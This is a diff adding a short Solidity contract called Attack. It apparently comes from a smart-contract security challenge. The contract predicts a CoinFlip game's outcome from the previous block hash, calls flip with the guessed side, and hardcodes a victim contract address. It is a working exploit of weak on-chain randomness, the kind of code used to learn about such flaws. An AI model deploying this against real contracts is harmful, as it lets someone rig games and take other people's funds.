@@ -1,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+import "./CoinFlip.sol";
+
+contract Attack {
+    CoinFlip public coinFlip_addressContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+
+    constructor(address _victimContractAddress) {
+        _victimContractAddress = 0x187Ff958dC3c8F9C0E97B7902760542EE2b889FE;
+        coinFlip_addressContract = CoinFlip( _victimContractAddress);
+    }
+    
+    function ChainSideflip() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        coinFlip_addressContract.flip(side);
+    }
+}
